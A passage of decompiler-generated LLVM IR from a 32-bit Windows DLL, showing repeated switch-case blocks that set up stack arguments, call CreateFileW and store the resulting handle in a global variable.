  %581 = ptrtoint i32* %580 to i32, !insn.addr !1230
  %582 = add i32 %esp.3.reload, -32, !insn.addr !1231
  %583 = inttoptr i32 %582 to i32*, !insn.addr !1231
  store i32 0, i32* %583, align 4, !insn.addr !1231
  %584 = add i32 %esp.3.reload, -36, !insn.addr !1232
  %585 = inttoptr i32 %584 to i32*, !insn.addr !1232
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %585, align 4, !insn.addr !1232
  %586 = add i32 %esp.3.reload, -40, !insn.addr !1233
  %587 = inttoptr i32 %586 to i32*, !insn.addr !1233
  store i32 2, i32* %587, align 4, !insn.addr !1233
  %588 = add i32 %esp.3.reload, -44, !insn.addr !1234
  %589 = inttoptr i32 %588 to i32*, !insn.addr !1234
  store i32 ptrtoint (i32* @global_var_10038270 to i32), i32* %589, align 4, !insn.addr !1234
  store i32 %581, i32* @global_var_1003d9c0, align 4, !insn.addr !1235
  %590 = add i32 %esp.3.reload, -48, !insn.addr !1236
  %591 = inttoptr i32 %590 to i32*, !insn.addr !1236
  store i32 %581, i32* %591, align 4, !insn.addr !1236
  store i32 %590, i32* %esp.5.reg2mem, !insn.addr !1237
  br label %dec_label_pc_10003425, !insn.addr !1237

dec_label_pc_10003047:                            ; preds = %dec_label_pc_10002bc4
  %592 = add i32 %esp.3.reload, -4, !insn.addr !1238
  %593 = inttoptr i32 %592 to i32*, !insn.addr !1238
  store i32 0, i32* %593, align 4, !insn.addr !1238
  %594 = add i32 %esp.3.reload, -8, !insn.addr !1239
  %595 = inttoptr i32 %594 to i32*, !insn.addr !1239
  store i32 128, i32* %595, align 4, !insn.addr !1239
  %596 = add i32 %esp.3.reload, -12, !insn.addr !1240
  %597 = inttoptr i32 %596 to i32*, !insn.addr !1240
  store i32 4, i32* %597, align 4, !insn.addr !1240
  %598 = add i32 %esp.3.reload, -16, !insn.addr !1241
  %599 = inttoptr i32 %598 to i32*, !insn.addr !1241
  store i32 0, i32* %599, align 4, !insn.addr !1241
  %600 = add i32 %esp.3.reload, -20, !insn.addr !1242
  %601 = inttoptr i32 %600 to i32*, !insn.addr !1242
  store i32 1, i32* %601, align 4, !insn.addr !1242
  %602 = add i32 %esp.3.reload, -24, !insn.addr !1243
  %603 = inttoptr i32 %602 to i32*, !insn.addr !1243
  store i32 4, i32* %603, align 4, !insn.addr !1243
  %604 = add i32 %esp.3.reload, -28, !insn.addr !1244
  %605 = inttoptr i32 %604 to i32*, !insn.addr !1244
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %605, align 4, !insn.addr !1244
  %606 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1245
  %607 = ptrtoint i32* %606 to i32, !insn.addr !1245
  %608 = add i32 %esp.3.reload, -32, !insn.addr !1246
  %609 = inttoptr i32 %608 to i32*, !insn.addr !1246
  store i32 0, i32* %609, align 4, !insn.addr !1246
  %610 = add i32 %esp.3.reload, -36, !insn.addr !1247
  %611 = inttoptr i32 %610 to i32*, !insn.addr !1247
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %611, align 4, !insn.addr !1247
  %612 = add i32 %esp.3.reload, -40, !insn.addr !1248
  %613 = inttoptr i32 %612 to i32*, !insn.addr !1248
  store i32 2, i32* %613, align 4, !insn.addr !1248
  %614 = add i32 %esp.3.reload, -44, !insn.addr !1249
  %615 = inttoptr i32 %614 to i32*, !insn.addr !1249
  store i32 ptrtoint (i32* @global_var_10038274 to i32), i32* %615, align 4, !insn.addr !1249
  store i32 %607, i32* @global_var_1003d9c0, align 4, !insn.addr !1250
  %616 = add i32 %esp.3.reload, -48, !insn.addr !1251
  %617 = inttoptr i32 %616 to i32*, !insn.addr !1251
  store i32 %607, i32* %617, align 4, !insn.addr !1251
  store i32 %616, i32* %esp.5.reg2mem, !insn.addr !1252
  br label %dec_label_pc_10003425, !insn.addr !1252

dec_label_pc_10003076:                            ; preds = %dec_label_pc_10002bc4
  %618 = add i32 %esp.3.reload, -4, !insn.addr !1253
  %619 = inttoptr i32 %618 to i32*, !insn.addr !1253
  store i32 0, i32* %619, align 4, !insn.addr !1253
  %620 = add i32 %esp.3.reload, -8, !insn.addr !1254
  %621 = inttoptr i32 %620 to i32*, !insn.addr !1254
  store i32 128, i32* %621, align 4, !insn.addr !1254
  %622 = add i32 %esp.3.reload, -12, !insn.addr !1255
  %623 = inttoptr i32 %622 to i32*, !insn.addr !1255
  store i32 4, i32* %623, align 4, !insn.addr !1255
  %624 = add i32 %esp.3.reload, -16, !insn.addr !1256
  %625 = inttoptr i32 %624 to i32*, !insn.addr !1256
  store i32 0, i32* %625, align 4, !insn.addr !1256
  %626 = add i32 %esp.3.reload, -20, !insn.addr !1257
  %627 = inttoptr i32 %626 to i32*, !insn.addr !1257
  store i32 1, i32* %627, align 4, !insn.addr !1257
  %628 = add i32 %esp.3.reload, -24, !insn.addr !1258
  %629 = inttoptr i32 %628 to i32*, !insn.addr !1258
  store i32 4, i32* %629, align 4, !insn.addr !1258
  %630 = add i32 %esp.3.reload, -28, !insn.addr !1259
  %631 = inttoptr i32 %630 to i32*, !insn.addr !1259
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %631, align 4, !insn.addr !1259
  %632 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1260
  %633 = ptrtoint i32* %632 to i32, !insn.addr !1260
  %634 = add i32 %esp.3.reload, -32, !insn.addr !1261
  %635 = inttoptr i32 %634 to i32*, !insn.addr !1261
  store i32 0, i32* %635, align 4, !insn.addr !1261
  %636 = add i32 %esp.3.reload, -36, !insn.addr !1262
  %637 = inttoptr i32 %636 to i32*, !insn.addr !1262
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %637, align 4, !insn.addr !1262
  %638 = add i32 %esp.3.reload, -40, !insn.addr !1263
  %639 = inttoptr i32 %638 to i32*, !insn.addr !1263
  store i32 2, i32* %639, align 4, !insn.addr !1263
  %640 = add i32 %esp.3.reload, -44, !insn.addr !1264
  %641 = inttoptr i32 %640 to i32*, !insn.addr !1264
  store i32 ptrtoint (i32* @global_var_10038278 to i32), i32* %641, align 4, !insn.addr !1264
  store i32 %633, i32* @global_var_1003d9c0, align 4, !insn.addr !1265
  %642 = add i32 %esp.3.reload, -48, !insn.addr !1266
  %643 = inttoptr i32 %642 to i32*, !insn.addr !1266
  store i32 %633, i32* %643, align 4, !insn.addr !1266
  store i32 %642, i32* %esp.5.reg2mem, !insn.addr !1267
  br label %dec_label_pc_10003425, !insn.addr !1267

dec_label_pc_100030a5:                            ; preds = %dec_label_pc_10002bc4
  %644 = add i32 %esp.3.reload, -4, !insn.addr !1268
  %645 = inttoptr i32 %644 to i32*, !insn.addr !1268
  store i32 0, i32* %645, align 4, !insn.addr !1268
  %646 = add i32 %esp.3.reload, -8, !insn.addr !1269
  %647 = inttoptr i32 %646 to i32*, !insn.addr !1269
  store i32 128, i32* %647, align 4, !insn.addr !1269
  %648 = add i32 %esp.3.reload, -12, !insn.addr !1270
  %649 = inttoptr i32 %648 to i32*, !insn.addr !1270
  store i32 4, i32* %649, align 4, !insn.addr !1270
  %650 = add i32 %esp.3.reload, -16, !insn.addr !1271
  %651 = inttoptr i32 %650 to i32*, !insn.addr !1271
  store i32 0, i32* %651, align 4, !insn.addr !1271
  %652 = add i32 %esp.3.reload, -20, !insn.addr !1272
  %653 = inttoptr i32 %652 to i32*, !insn.addr !1272
  store i32 1, i32* %653, align 4, !insn.addr !1272
  %654 = add i32 %esp.3.reload, -24, !insn.addr !1273
  %655 = inttoptr i32 %654 to i32*, !insn.addr !1273
  store i32 4, i32* %655, align 4, !insn.addr !1273
  %656 = add i32 %esp.3.reload, -28, !insn.addr !1274
  %657 = inttoptr i32 %656 to i32*, !insn.addr !1274
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %657, align 4, !insn.addr !1274
  %658 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1275
  %659 = ptrtoint i32* %658 to i32, !insn.addr !1275
  %660 = add i32 %esp.3.reload, -32, !insn.addr !1276
  %661 = inttoptr i32 %660 to i32*, !insn.addr !1276
  store i32 0, i32* %661, align 4, !insn.addr !1276
  %662 = add i32 %esp.3.reload, -36, !insn.addr !1277
  %663 = inttoptr i32 %662 to i32*, !insn.addr !1277
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %663, align 4, !insn.addr !1277
  %664 = add i32 %esp.3.reload, -40, !insn.addr !1278
  %665 = inttoptr i32 %664 to i32*, !insn.addr !1278
  store i32 2, i32* %665, align 4, !insn.addr !1278
  %666 = add i32 %esp.3.reload, -44, !insn.addr !1279
  %667 = inttoptr i32 %666 to i32*, !insn.addr !1279
  store i32 ptrtoint (i32* @global_var_1003827c to i32), i32* %667, align 4, !insn.addr !1279
  store i32 %659, i32* @global_var_1003d9c0, align 4, !insn.addr !1280
  %668 = add i32 %esp.3.reload, -48, !insn.addr !1281
  %669 = inttoptr i32 %668 to i32*, !insn.addr !1281
  store i32 %659, i32* %669, align 4, !insn.addr !1281
  store i32 %668, i32* %esp.5.reg2mem, !insn.addr !1282
  br label %dec_label_pc_10003425, !insn.addr !1282

dec_label_pc_100030d4:                            ; preds = %dec_label_pc_10002bc4
  %670 = add i32 %esp.3.reload, -4, !insn.addr !1283
  %671 = inttoptr i32 %670 to i32*, !insn.addr !1283
  store i32 0, i32* %671, align 4, !insn.addr !1283
  %672 = add i32 %esp.3.reload, -8, !insn.addr !1284
  %673 = inttoptr i32 %672 to i32*, !insn.addr !1284
  store i32 128, i32* %673, align 4, !insn.addr !1284
  %674 = add i32 %esp.3.reload, -12, !insn.addr !1285
  %675 = inttoptr i32 %674 to i32*, !insn.addr !1285
  store i32 4, i32* %675, align 4, !insn.addr !1285
  %676 = add i32 %esp.3.reload, -16, !insn.addr !1286
  %677 = inttoptr i32 %676 to i32*, !insn.addr !1286
  store i32 0, i32* %677, align 4, !insn.addr !1286
  %678 = add i32 %esp.3.reload, -20, !insn.addr !1287
  %679 = inttoptr i32 %678 to i32*, !insn.addr !1287
  store i32 1, i32* %679, align 4, !insn.addr !1287
  %680 = add i32 %esp.3.reload, -24, !insn.addr !1288
  %681 = inttoptr i32 %680 to i32*, !insn.addr !1288
  store i32 4, i32* %681, align 4, !insn.addr !1288
  %682 = add i32 %esp.3.reload, -28, !insn.addr !1289
  %683 = inttoptr i32 %682 to i32*, !insn.addr !1289
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %683, align 4, !insn.addr !1289
  %684 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1290
  %685 = ptrtoint i32* %684 to i32, !insn.addr !1290
  %686 = add i32 %esp.3.reload, -32, !insn.addr !1291
  %687 = inttoptr i32 %686 to i32*, !insn.addr !1291
  store i32 0, i32* %687, align 4, !insn.addr !1291
  %688 = add i32 %esp.3.reload, -36, !insn.addr !1292
  %689 = inttoptr i32 %688 to i32*, !insn.addr !1292
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %689, align 4, !insn.addr !1292
  %690 = add i32 %esp.3.reload, -40, !insn.addr !1293
  %691 = inttoptr i32 %690 to i32*, !insn.addr !1293
  store i32 2, i32* %691, align 4, !insn.addr !1293
  %692 = add i32 %esp.3.reload, -44, !insn.addr !1294
  %693 = inttoptr i32 %692 to i32*, !insn.addr !1294
  store i32 ptrtoint (i32* @global_var_10038280 to i32), i32* %693, align 4, !insn.addr !1294
  store i32 %685, i32* @global_var_1003d9c0, align 4, !insn.addr !1295
  %694 = add i32 %esp.3.reload, -48, !insn.addr !1296
  %695 = inttoptr i32 %694 to i32*, !insn.addr !1296
  store i32 %685, i32* %695, align 4, !insn.addr !1296
  store i32 %694, i32* %esp.5.reg2mem, !insn.addr !1297
  br label %dec_label_pc_10003425, !insn.addr !1297

dec_label_pc_10003103:                            ; preds = %dec_label_pc_10002bc4
  %696 = add i32 %esp.3.reload, -4, !insn.addr !1298
  %697 = inttoptr i32 %696 to i32*, !insn.addr !1298
  store i32 0, i32* %697, align 4, !insn.addr !1298
  %698 = add i32 %esp.3.reload, -8, !insn.addr !1299
  %699 = inttoptr i32 %698 to i32*, !insn.addr !1299
  store i32 128, i32* %699, align 4, !insn.addr !1299
  %700 = add i32 %esp.3.reload, -12, !insn.addr !1300
  %701 = inttoptr i32 %700 to i32*, !insn.addr !1300
  store i32 4, i32* %701, align 4, !insn.addr !1300
  %702 = add i32 %esp.3.reload, -16, !insn.addr !1301
  %703 = inttoptr i32 %702 to i32*, !insn.addr !1301
  store i32 0, i32* %703, align 4, !insn.addr !1301
  %704 = add i32 %esp.3.reload, -20, !insn.addr !1302
  %705 = inttoptr i32 %704 to i32*, !insn.addr !1302
  store i32 1, i32* %705, align 4, !insn.addr !1302
  %706 = add i32 %esp.3.reload, -24, !insn.addr !1303
  %707 = inttoptr i32 %706 to i32*, !insn.addr !1303
  store i32 4, i32* %707, align 4, !insn.addr !1303
  %708 = add i32 %esp.3.reload, -28, !insn.addr !1304
  %709 = inttoptr i32 %708 to i32*, !insn.addr !1304
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %709, align 4, !insn.addr !1304
  %710 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1305
  %711 = ptrtoint i32* %710 to i32, !insn.addr !1305
  %712 = add i32 %esp.3.reload, -32, !insn.addr !1306
  %713 = inttoptr i32 %712 to i32*, !insn.addr !1306
  store i32 0, i32* %713, align 4, !insn.addr !1306
  %714 = add i32 %esp.3.reload, -36, !insn.addr !1307
  %715 = inttoptr i32 %714 to i32*, !insn.addr !1307
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %715, align 4, !insn.addr !1307
  %716 = add i32 %esp.3.reload, -40, !insn.addr !1308
  %717 = inttoptr i32 %716 to i32*, !insn.addr !1308
  store i32 2, i32* %717, align 4, !insn.addr !1308
  %718 = add i32 %esp.3.reload, -44, !insn.addr !1309
  %719 = inttoptr i32 %718 to i32*, !insn.addr !1309
  store i32 ptrtoint (i32* @global_var_10038284 to i32), i32* %719, align 4, !insn.addr !1309
  store i32 %711, i32* @global_var_1003d9c0, align 4, !insn.addr !1310
  %720 = add i32 %esp.3.reload, -48, !insn.addr !1311
  %721 = inttoptr i32 %720 to i32*, !insn.addr !1311
  store i32 %711, i32* %721, align 4, !insn.addr !1311
  store i32 %720, i32* %esp.5.reg2mem, !insn.addr !1312
  br label %dec_label_pc_10003425, !insn.addr !1312

dec_label_pc_10003132:                            ; preds = %dec_label_pc_10002bc4
  %722 = add i32 %esp.3.reload, -4, !insn.addr !1313
  %723 = inttoptr i32 %722 to i32*, !insn.addr !1313
  store i32 0, i32* %723, align 4, !insn.addr !1313
  %724 = add i32 %esp.3.reload, -8, !insn.addr !1314
  %725 = inttoptr i32 %724 to i32*, !insn.addr !1314
  store i32 128, i32* %725, align 4, !insn.addr !1314
  %726 = add i32 %esp.3.reload, -12, !insn.addr !1315
  %727 = inttoptr i32 %726 to i32*, !insn.addr !1315
  store i32 4, i32* %727, align 4, !insn.addr !1315
  %728 = add i32 %esp.3.reload, -16, !insn.addr !1316
  %729 = inttoptr i32 %728 to i32*, !insn.addr !1316
  store i32 0, i32* %729, align 4, !insn.addr !1316
  %730 = add i32 %esp.3.reload, -20, !insn.addr !1317
  %731 = inttoptr i32 %730 to i32*, !insn.addr !1317
  store i32 1, i32* %731, align 4, !insn.addr !1317
  %732 = add i32 %esp.3.reload, -24, !insn.addr !1318
  %733 = inttoptr i32 %732 to i32*, !insn.addr !1318
  store i32 4, i32* %733, align 4, !insn.addr !1318
  %734 = add i32 %esp.3.reload, -28, !insn.addr !1319
  %735 = inttoptr i32 %734 to i32*, !insn.addr !1319
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %735, align 4, !insn.addr !1319
  %736 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1320
  %737 = ptrtoint i32* %736 to i32, !insn.addr !1320
  %738 = add i32 %esp.3.reload, -32, !insn.addr !1321
  %739 = inttoptr i32 %738 to i32*, !insn.addr !1321
  store i32 0, i32* %739, align 4, !insn.addr !1321
  %740 = add i32 %esp.3.reload, -36, !insn.addr !1322
  %741 = inttoptr i32 %740 to i32*, !insn.addr !1322
  store i32 ptrtoint (i32* @global_var_10040038 to i32), i32* %741, align 4, !insn.addr !1322
  %742 = add i32 %esp.3.reload, -40, !insn.addr !1323
  %743 = inttoptr i32 %742 to i32*, !insn.addr !1323
  store i32 2, i32* %743, align 4, !insn.addr !1323
  %744 = add i32 %esp.3.reload, -44, !insn.addr !1324
  %745 = inttoptr i32 %744 to i32*, !insn.addr !1324
  store i32 ptrtoint (i32* @global_var_10038288 to i32), i32* %745, align 4, !insn.addr !1324
  store i32 %737, i32* @global_var_1003d9c0, align 4, !insn.addr !1325
  %746 = add i32 %esp.3.reload, -48, !insn.addr !1326
  %747 = inttoptr i32 %746 to i32*, !insn.addr !1326
  store i32 %737, i32* %747, align 4, !insn.addr !1326
  store i32 %746, i32* %esp.5.reg2mem, !insn.addr !1327
  br label %dec_label_pc_10003425, !insn.addr !1327

dec_label_pc_10003161:                            ; preds = %dec_label_pc_10002bc4
  %748 = call i128 @__asm_movaps(i128 %37), !insn.addr !1328
  %749 = add i32 %esp.3.reload, -4, !insn.addr !1329
  %750 = inttoptr i32 %749 to i32*, !insn.addr !1329
  store i32 0, i32* %750, align 4, !insn.addr !1329
  %751 = add i32 %esp.3.reload, -8, !insn.addr !1330
  %752 = inttoptr i32 %751 to i32*, !insn.addr !1330
  store i32 128, i32* %752, align 4, !insn.addr !1330
  %753 = add i32 %esp.3.reload, -12, !insn.addr !1331
  %754 = inttoptr i32 %753 to i32*, !insn.addr !1331
  store i32 4, i32* %754, align 4, !insn.addr !1331
  %755 = add i32 %esp.3.reload, -16, !insn.addr !1332
  %756 = inttoptr i32 %755 to i32*, !insn.addr !1332
  store i32 0, i32* %756, align 4, !insn.addr !1332
  %757 = add i32 %esp.3.reload, -20, !insn.addr !1333
  %758 = inttoptr i32 %757 to i32*, !insn.addr !1333
  store i32 1, i32* %758, align 4, !insn.addr !1333
  %759 = add i32 %esp.3.reload, -24, !insn.addr !1334
  %760 = inttoptr i32 %759 to i32*, !insn.addr !1334
  store i32 4, i32* %760, align 4, !insn.addr !1334
  %761 = add i32 %esp.3.reload, -28, !insn.addr !1335
  %762 = inttoptr i32 %761 to i32*, !insn.addr !1335
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %762, align 4, !insn.addr !1335
  %763 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1336
  call void @__asm_movups(i128 %763, i128 %748), !insn.addr !1336
  %764 = call i32* @CreateFileW(i16* inttoptr (i32 4915267 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1337
  %765 = ptrtoint i32* %764 to i32, !insn.addr !1337
  store i32 %765, i32* @global_var_1003d9c0, align 4, !insn.addr !1338
  store i32 %33, i32* %ecx.9.reg2mem, !insn.addr !1339
  br label %dec_label_pc_100031a4, !insn.addr !1339

dec_label_pc_100031a4:                            ; preds = %dec_label_pc_100031a4, %dec_label_pc_10003161
  %ecx.9.reload = load i32, i32* %ecx.9.reg2mem
  %766 = inttoptr i32 %ecx.9.reload to i16*, !insn.addr !1340
  %767 = load i16, i16* %766, align 2, !insn.addr !1340
  %768 = add i32 %ecx.9.reload, 2, !insn.addr !1341
  %769 = icmp eq i16 %767, 0, !insn.addr !1342
  %770 = icmp eq i1 %769, false, !insn.addr !1343
  store i32 %768, i32* %ecx.9.reg2mem, !insn.addr !1343
  store i32 %768, i32* %.pn.reg2mem, !insn.addr !1343
  store i32 %765, i32* %edx.6.reg2mem, !insn.addr !1343
  store i32 %761, i32* %esp.4.reg2mem, !insn.addr !1343
  br i1 %770, label %dec_label_pc_100031a4, label %dec_label_pc_10003413, !insn.addr !1343

dec_label_pc_100031ba:                            ; preds = %dec_label_pc_10002bc4
  %771 = call i128 @__asm_movaps(i128 %36), !insn.addr !1344
  %772 = add i32 %esp.3.reload, -4, !insn.addr !1345
  %773 = inttoptr i32 %772 to i32*, !insn.addr !1345
  store i32 0, i32* %773, align 4, !insn.addr !1345
  %774 = add i32 %esp.3.reload, -8, !insn.addr !1346
  %775 = inttoptr i32 %774 to i32*, !insn.addr !1346
  store i32 128, i32* %775, align 4, !insn.addr !1346
  %776 = add i32 %esp.3.reload, -12, !insn.addr !1347
  %777 = inttoptr i32 %776 to i32*, !insn.addr !1347
  store i32 4, i32* %777, align 4, !insn.addr !1347
  %778 = add i32 %esp.3.reload, -16, !insn.addr !1348
  %779 = inttoptr i32 %778 to i32*, !insn.addr !1348
  store i32 0, i32* %779, align 4, !insn.addr !1348
  %780 = add i32 %esp.3.reload, -20, !insn.addr !1349
  %781 = inttoptr i32 %780 to i32*, !insn.addr !1349
  store i32 1, i32* %781, align 4, !insn.addr !1349
  %782 = add i32 %esp.3.reload, -24, !insn.addr !1350
  %783 = inttoptr i32 %782 to i32*, !insn.addr !1350
  store i32 4, i32* %783, align 4, !insn.addr !1350
  %784 = add i32 %esp.3.reload, -28, !insn.addr !1351
  %785 = inttoptr i32 %784 to i32*, !insn.addr !1351
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %785, align 4, !insn.addr !1351
  %786 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1352
  call void @__asm_movups(i128 %786, i128 %771), !insn.addr !1352
  %787 = call i32* @CreateFileW(i16* inttoptr (i32 93 to i16*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1353
  %788 = ptrtoint i32* %787 to i32, !insn.addr !1353
  store i32 %788, i32* @global_var_1003d9c0, align 4, !insn.addr !1354
  store i32 %33, i32* %ecx.10.reg2mem, !insn.addr !1355
  br label %dec_label_pc_100031f6, !insn.addr !1355

dec_label_pc_100031f6:                            ; preds = %dec_label_pc_100031f6, %dec_label_pc_100031ba
  %ecx.10.reload = load i32, i32* %ecx.10.reg2mem
  %789 = inttoptr i32 %ecx.10.reload to i16*, !insn.addr !1356
  %790 = load i16, i16* %789, align 2, !insn.addr !1356
  %791 = add i32 %ecx.10.reload, 2, !insn.addr !1357
  %792 = icmp eq i16 %790, 0, !insn.addr !1358
  %793 = icmp eq i1 %792, false, !insn.addr !1359
  store i32 %791, i32* %ecx.10.reg2mem, !insn.addr !1359
  store i32 %791, i32* %.pn.reg2mem, !insn.addr !1359
  store i32 %788, i32* %edx.6.reg2mem, !insn.addr !1359
  store i32 %784, i32* %esp.4.reg2mem, !insn.addr !1359
  br i1 %793, label %dec_label_pc_100031f6, label %dec_label_pc_10003413, !insn.addr !1359

dec_label_pc_1000320c:                            ; preds = %dec_label_pc_10002bc4
  %794 = call i128 @__asm_movaps(i128 %35), !insn.addr !1360
  %795 = add i32 %esp.3.reload, -4, !insn.addr !1361
  %796 = inttoptr i32 %795 to i32*, !insn.addr !1361
  store i32 0, i32* %796, align 4, !insn.addr !1361
  %797 = add i32 %esp.3.reload, -8, !insn.addr !1362
  %798 = inttoptr i32 %797 to i32*, !insn.addr !1362
  store i32 128, i32* %798, align 4, !insn.addr !1362
  %799 = add i32 %esp.3.reload, -12, !insn.addr !1363
  %800 = inttoptr i32 %799 to i32*, !insn.addr !1363
  store i32 4, i32* %800, align 4, !insn.addr !1363
  %801 = add i32 %esp.3.reload, -16, !insn.addr !1364
  %802 = inttoptr i32 %801 to i32*, !insn.addr !1364
  store i32 0, i32* %802, align 4, !insn.addr !1364
  %803 = add i32 %esp.3.reload, -20, !insn.addr !1365
  %804 = inttoptr i32 %803 to i32*, !insn.addr !1365
  store i32 1, i32* %804, align 4, !insn.addr !1365
  %805 = add i32 %esp.3.reload, -24, !insn.addr !1366
  %806 = inttoptr i32 %805 to i32*, !insn.addr !1366
  store i32 4, i32* %806, align 4, !insn.addr !1366
  %807 = add i32 %esp.3.reload, -28, !insn.addr !1367
  %808 = inttoptr i32 %807 to i32*, !insn.addr !1367
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %808, align 4, !insn.addr !1367
  %809 = load i128, i128* %stack_var_-108, align 8, !insn.addr !1368
  call void @__asm_movups(i128 %809, i128 %794), !insn.addr !1368
  %810 = call i32* @CreateFileW(i16* inttoptr (i32 5111895 to i16*), i32 93, i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1369
  %811 = ptrtoint i32* %810 to i32, !insn.addr !1369
  store i32 %811, i32* @global_var_1003d9c0, align 4, !insn.addr !1370
  store i32 %33, i32* %ecx.11.reg2mem, !insn.addr !1371
  br label %dec_label_pc_10003250, !insn.addr !1371

dec_label_pc_10003250:                            ; preds = %dec_label_pc_10003250, %dec_label_pc_1000320c
  %ecx.11.reload = load i32, i32* %ecx.11.reg2mem
  %812 = inttoptr i32 %ecx.11.reload to i16*, !insn.addr !1372
  %813 = load i16, i16* %812, align 2, !insn.addr !1372
  %814 = add i32 %ecx.11.reload, 2, !insn.addr !1373
  %815 = icmp eq i16 %813, 0, !insn.addr !1374
  %816 = icmp eq i1 %815, false, !insn.addr !1375
  store i32 %814, i32* %ecx.11.reg2mem, !insn.addr !1375
  store i32 %814, i32* %.pn.reg2mem, !insn.addr !1375
  store i32 %811, i32* %edx.6.reg2mem, !insn.addr !1375
  store i32 %807, i32* %esp.4.reg2mem, !insn.addr !1375
  br i1 %816, label %dec_label_pc_10003250, label %dec_label_pc_10003413, !insn.addr !1375

dec_label_pc_10003266:                            ; preds = %dec_label_pc_10002bc4
  %817 = add i32 %esp.3.reload, -4, !insn.addr !1376
  %818 = inttoptr i32 %817 to i32*, !insn.addr !1376
  store i32 0, i32* %818, align 4, !insn.addr !1376
  %819 = add i32 %esp.3.reload, -8, !insn.addr !1377
  %820 = inttoptr i32 %819 to i32*, !insn.addr !1377
  store i32 128, i32* %820, align 4, !insn.addr !1377
  %821 = add i32 %esp.3.reload, -12, !insn.addr !1378
  %822 = inttoptr i32 %821 to i32*, !insn.addr !1378
  store i32 4, i32* %822, align 4, !insn.addr !1378
  %823 = add i32 %esp.3.reload, -16, !insn.addr !1379
  %824 = inttoptr i32 %823 to i32*, !insn.addr !1379
  store i32 0, i32* %824, align 4, !insn.addr !1379
  %825 = add i32 %esp.3.reload, -20, !insn.addr !1380
  %826 = inttoptr i32 %825 to i32*, !insn.addr !1380
  store i32 1, i32* %826, align 4, !insn.addr !1380
  %827 = add i32 %esp.3.reload, -24, !insn.addr !1381
  %828 = inttoptr i32 %827 to i32*, !insn.addr !1381
  store i32 4, i32* %828, align 4, !insn.addr !1381
  %829 = add i32 %esp.3.reload, -28, !insn.addr !1382
  %830 = inttoptr i32 %829 to i32*, !insn.addr !1382
  store i32 ptrtoint (i16** @global_var_1003fd30 to i32), i32* %830, align 4, !insn.addr !1382
  store i128 4522075, i128* %stack_var_-108, align 8, !insn.addr !1383
  %831 = call i32* @CreateFileW(i16* %stack_var_-216.0.reload, i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @4 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @4 to i32), i32 ptrtoint (i32* @4 to i32), i32* nonnull @4), !insn.addr !1384
  %832 = ptrtoint i32* %831 to i32, !insn.addr !1384
  store i32 %832, i32* @global_var_1003d9c0, align 4, !insn.addr !1385
  store i32 %33, i32* %ecx.12.reg2mem, !insn.addr !1386
